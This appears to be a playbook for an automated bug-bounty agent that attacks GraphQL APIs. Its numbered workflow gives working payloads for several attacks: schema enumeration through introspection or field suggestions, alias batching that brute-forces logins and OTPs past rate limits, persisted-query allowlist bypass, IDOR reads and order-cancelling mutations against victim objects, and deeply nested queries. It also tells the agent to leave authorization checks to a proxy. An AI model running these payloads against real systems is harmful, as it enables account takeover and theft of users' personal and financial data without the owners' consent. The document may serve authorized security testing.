# C15_graphql_introspection

Use GraphQL introspection to build a full schema map, then systematically attack: alias batching (rate-limit bypass), persisted-operation query-allowlist bypass, field-suggestion oracle (when introspection is disabled), and IDOR on object-resolver arguments. Introspection alone is not a finding; each vector requires a demonstrated exploit. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface has a GraphQL endpoint (`/graphql`, `/api/graphql`, `/gql`, `Content-Type: application/json` with `{"query":` body pattern in traffic).
- Recon or JS analysis reveals GraphQL operation names, types, or fragment patterns.
- Bug-class hints include `graphql`, `introspection`, `alias-batching`, `persisted-queries`, or `idor`.

---

## Workflow

1. **Load assignment and confirm GraphQL endpoint.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   Confirm the GraphQL endpoint responds to a basic introspection query:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ __schema { queryType { name } } }" }, auth_profile: "attacker", egress_profile })
   ```

2. **Full introspection schema dump.**
   If introspection is enabled, execute the full introspection query:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ __schema { types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }" }, auth_profile: "attacker", egress_profile })
   ```
   Map: all Query and Mutation root fields, all object types with fields, argument types, directives. Note sensitive type names: `User`, `Admin`, `Payment`, `Token`, `Session`, `ApiKey`, `Invoice`, `Order`.

3. **Introspection disabled — field-suggestion oracle.**
   If introspection is blocked, test whether the server leaks type/field names via suggestions:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ usr { id } }" }, auth_profile: "attacker", egress_profile })
   ```
   If the error response says `Did you mean "user"?` or `Did you mean "users"?`, the field-suggestion oracle is active. Use it to enumerate the schema by submitting near-miss names:
   - `usr` → `user`
   - `profil` → `profile`
   - `paymt` → `payment`
   Iterate through near-miss patterns for common field names until the schema is substantially reconstructed.

4. **Alias batching — rate-limit bypass.**
   Identify an endpoint subject to rate limiting (e.g. login, OTP check, coupon redemption). Use GraphQL aliases to send N queries in a single HTTP request, bypassing per-request rate limits:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ a1: login(email: \"victim@example.com\", password: \"pass1\") { token } a2: login(email: \"victim@example.com\", password: \"pass2\") { token } ... a100: login(...) { token } }" }, auth_profile: "attacker", egress_profile })
   ```
   If the server processes all aliases and returns N results in one response without triggering a rate limit, the bypass is confirmed. Use this to brute-force a PIN, OTP, or short password.

5. **Persisted-operation / query-allowlist bypass.**
   If the server enforces a persisted-query allowlist (rejects arbitrary queries, requires a pre-registered `operationId` or `sha256Hash`):
   a. Extract known operation hashes from the JS bundle (look for `persistedQueries` maps or `operationId` assignments).
   b. Test whether the server also accepts raw queries via a toggle parameter: `?operationName=IntrospectionQuery`, `extensions.persistedQuery.version=1` with a known hash, or a `bypass-allowlist` header.
   c. Test APQ (Automatic Persisted Queries): send an unknown query with a fabricated hash; the server may respond with `PersistedQueryNotFound` and then accept the full query text on a second request.
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ user(id: 1) { email apiKey } }", extensions: { persistedQuery: { version: 1, sha256Hash: "FABRICATED_HASH" } } }, auth_profile: "attacker", egress_profile })
   ```

6. **IDOR on GraphQL resolver arguments.**
   For each Query/Mutation that accepts an ID argument (`user(id: ID!)`, `order(orderId: String!)`, `invoice(invoiceId: Int!)`):
   a. Fetch the attacker's own object to confirm the field structure.
   b. Replace the ID with a known victim object ID (from C5 or from sequential enumeration):
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ order(orderId: \"VICTIM_ORDER_ID\") { id status items { name price } buyer { email } } }" }, auth_profile: "attacker", egress_profile })
   ```
   c. Confirm the response contains victim-owned data (email, name, PII, financial fields).
   d. Test mutation IDOR: can the attacker update a victim's object via mutation arguments?
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "mutation { updateOrder(orderId: \"VICTIM_ORDER_ID\", status: \"cancelled\") { id status } }" }, auth_profile: "attacker", egress_profile })
   ```

7. **Deeply nested / circular query DOS.**
   Test query complexity limits with a deeply nested query (not a DOS attack — just confirm the limit exists):
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/graphql", body: { query: "{ user { orders { items { product { category { products { orders { items { id } } } } } } } } }" }, auth_profile: "attacker", egress_profile })
   ```
   If the server returns a 200 with data rather than a complexity-limit error, note this as supporting evidence for alias-batching impact.

8. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/graphql", method: "POST", bug_class: "graphql_idor", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "order(orderId: VICTIM_ID) returned victim's order data as attacker" }] })
   ```

9. **Record chain attempt.**
   ```
   mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "graphql-idor-to-data-exfil", step: "resolver_idor_confirmed", evidence: "GraphQL order resolver returns victim PII for attacker-supplied orderId", outcome: "finding_recorded" })
   ```

10. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "GraphQL resolver IDOR — cross-account order access", severity: "high", cwe: "CWE-639", endpoint: "/graphql (order resolver)", description: "...", proof_of_concept: "<query with victim orderId + response showing victim email and items>", response_evidence: "...", impact: "Attacker can read any user's order data including PII and financial details", validated: true })
    ```

11. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["GraphQL IDOR feeds C5 IDOR burst for full enumeration", "Alias batching on login endpoint — brute-force vector for C12 ATO"] })
    ```

12. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "resolver_idor_replay", notes: "Re-run order query with fresh victim ID from listing; confirm consistent data leak" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full introspection schema dump (or field-suggestion enumeration log) confirming the type structure.
- For IDOR: the GraphQL query with victim ID, full response body with victim-owned data fields.
- For alias batching: the batched query (with alias count), the response showing N results processed, and the rate-limit count that would normally have blocked it.
- For persisted-query bypass: the original restriction response and the bypassed query response.

---

## Stop conditions

- Introspection disabled and field-suggestion oracle also disabled; schema cannot be enumerated via either method.
- All resolver ID arguments validated server-side; IDOR attempts return `null` or 403.
- Alias batching subject to per-alias rate limiting (server counts alias requests independently).
- Persisted-query allowlist enforced; no bypass found.
- Two WAF blocks on GraphQL mutations — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Introspection alone is not a finding.** Per hunter-agent rules, GraphQL introspection without a working exploit is explicitly excluded from standalone findings. Only record if a concrete impact is demonstrated.
- **Type name confusion.** A type named `AdminUser` in the schema does not mean the attacker can access it. Test access via actual queries before claiming privileged type exposure.
- **Alias batching with server-side per-alias limit.** Some servers count each alias as a separate request against the rate limit. Confirm by checking whether you receive a rate-limit error after fewer aliases than the batch count.
- **Persisted-query version drift.** APQ hashes are version-specific. A hash from the JS bundle may be from an older schema version; confirm the hash still works against the current endpoint.

---

## Next chain

Feeds into **C5_idor_burst** (burst the discovered resolver IDs at scale), **C14_race_condition_finbal** (alias-batch race on financial mutations), and **C12_account_takeover** (brute-force login via alias batching).
